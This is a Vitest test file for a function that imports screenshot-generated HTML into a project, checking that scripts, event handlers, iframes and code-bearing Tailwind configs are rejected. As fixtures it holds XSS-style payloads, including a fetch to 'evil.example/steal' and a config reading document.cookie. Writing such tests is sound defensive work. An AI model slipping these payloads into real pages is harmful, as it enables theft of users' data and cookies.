import { describe, expect, it, vi } from 'vitest';
import { importScreenshotHtml } from './import';

const html = '<!doctype html><html><body><h1>Generated</h1></body></html>';

function project(files: Record<string, { type: 'file' | 'folder'; content?: string }> = {}) {
  return {
    files: { get: () => files },
    queueProjectMutation: async <T>(callback: () => Promise<T>) => callback(),
    createFile: vi.fn(async (_path: string, _content: string) => true),
    showWorkbench: { set: vi.fn() },
    setSelectedFile: vi.fn(),
  };
}

describe('screenshot HTML import', () => {
  it('imports validated HTML to an isolated file without starting a server', async () => {
    const workbench = project();
    const path = await importScreenshotHtml(html, workbench);
    expect(path).toBe('/home/project/screenshot-generated.html');
    expect(workbench.createFile).toHaveBeenCalledWith(path, html);
    expect(workbench.setSelectedFile).toHaveBeenCalledWith(path);
  });

  it('never overwrites an existing file', async () => {
    const workbench = project({ '/home/project/screenshot-generated.html': { type: 'file', content: 'user data' } });
    await expect(importScreenshotHtml(html, workbench)).rejects.toThrow(/already exists/i);
    expect(workbench.createFile).not.toHaveBeenCalled();
  });

  it('rejects active HTML in an existing Bolt project before any write', async () => {
    const workbench = project();
    const active = '<!doctype html><html><body><script>alert(1)</script></body></html>';
    await expect(importScreenshotHtml(active, workbench)).rejects.toThrow(/inline script|active content/i);
    expect(workbench.createFile).not.toHaveBeenCalled();
  });

  it('rejects event handlers and embeds before any write', async () => {
    const workbench = project();
    await expect(
      importScreenshotHtml('<!doctype html><html><body><img src="x" onerror="alert(1)"></body></html>', workbench),
    ).rejects.toThrow(/active content/i);
    await expect(
      importScreenshotHtml('<!doctype html><html><body><iframe src="x"></iframe></body></html>', workbench),
    ).rejects.toThrow(/active content/i);
    expect(workbench.createFile).not.toHaveBeenCalled();
  });

  it('imports HTML+Tailwind output by dropping the CDN script instead of refusing it', async () => {
    const workbench = project();

    // Every HTML+Tailwind generation carries this tag; refusing it made import impossible.
    const tailwind =
      '<!doctype html><html><head><script src="https://cdn.tailwindcss.com"></script>' +
      '<style>body{margin:0}</style></head><body><h1 class="text-3xl">Bakery</h1></body></html>';

    await importScreenshotHtml(tailwind, workbench);

    const written = workbench.createFile.mock.calls[0][1] as unknown as string;
    expect(written).not.toContain('<script');
    expect(written).toContain('text-3xl');
    expect(written).toContain('body{margin:0}');
  });

  it('preserves static CSS and images in a Bolt project', async () => {
    const workbench = project();

    const css =
      '<!doctype html><html><head><style>body{color:red}</style></head><body><img src="https://example.org/p.png"></body></html>';
    await importScreenshotHtml(css, workbench);
    expect(workbench.createFile).toHaveBeenCalledWith('/home/project/screenshot-generated.html', css);
  });

  it('keeps the inline Tailwind config as inert JSON instead of dropping the palette and fonts', async () => {
    const workbench = project();

    // Shape measured on the deployed backend: one inline script, pure `tailwind.config = {...}`.
    const generated =
      '<!doctype html><html><head><script src="https://cdn.tailwindcss.com"></script>' +
      "<script>\n  tailwind.config = {\n    theme: { extend: { colors: { ink:'#171719', lime:'#c8f169' }," +
      " fontFamily:{ sans:['Inter','ui-sans-serif'] } } }\n  }\n</script>" +
      '</head><body><h1 class="text-ink">Generated</h1></body></html>';

    await importScreenshotHtml(generated, workbench);

    const written = workbench.createFile.mock.calls[0][1] as unknown as string;

    // No executable script survives...
    expect(written).not.toMatch(/<script(?![^>]*application\/json)/i);
    expect(written).not.toContain('tailwind.config =');

    // ...but the configuration is still in the file, as data.
    expect(written).toContain('type="application/json"');
    expect(written).toContain('"#c8f169"');
    expect(written).toContain('"Inter"');
    expect(written).toContain('text-ink');
  });

  it('rejects a real inline script even when a page also carries a Tailwind config', async () => {
    const workbench = project();

    const mixed =
      "<!doctype html><html><head><script>tailwind.config = { theme: { colors: { a: '#fff' } } };</script>" +
      '<script>fetch("https://evil.example/steal")</script></head><body><p>x</p></body></html>';

    await expect(importScreenshotHtml(mixed, workbench)).rejects.toThrow(/inline script/i);
    expect(workbench.createFile).not.toHaveBeenCalled();
  });

  it('rejects a config that escapes into code (function, DOM access, template literal)', async () => {
    const workbench = project();

    const sneaky =
      '<!doctype html><html><head><script>tailwind.config = { theme: { extend: { x: document.cookie } } };</script>' +
      '</head><body><p>x</p></body></html>';

    await expect(importScreenshotHtml(sneaky, workbench)).rejects.toThrow(/inline script/i);

    const fn =
      '<!doctype html><html><head><script>tailwind.config = { theme: { extend: { x: (() => 1)() } } };</script>' +
      '</head><body><p>x</p></body></html>';

    await expect(importScreenshotHtml(fn, workbench)).rejects.toThrow(/inline script/i);
    expect(workbench.createFile).not.toHaveBeenCalled();
  });

  it('does not report success if file creation fails', async () => {
    const workbench = project();
    workbench.createFile.mockResolvedValueOnce(false);
    await expect(importScreenshotHtml(html, workbench)).rejects.toThrow(/could not/i);
    expect(workbench.showWorkbench.set).not.toHaveBeenCalled();
  });
});
